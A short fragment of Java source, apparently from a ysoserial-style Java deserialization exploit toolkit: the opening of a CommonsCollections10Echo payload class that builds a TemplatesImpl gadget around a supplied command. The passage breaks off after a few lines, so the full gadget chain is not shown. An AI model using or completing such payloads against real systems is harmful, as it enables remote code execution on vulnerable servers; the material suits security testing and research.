...
public class CommonsCollections10Echo extends PayloadRunner implements ObjectPayload<HashSet> {

    public HashSet getObject(final String command) throws Exception {
        //final Object templates = Gadgets.createTemplatesImpl(command);
        final Object templates = Gadgets.createTemplatesImpl(command, "notnull");
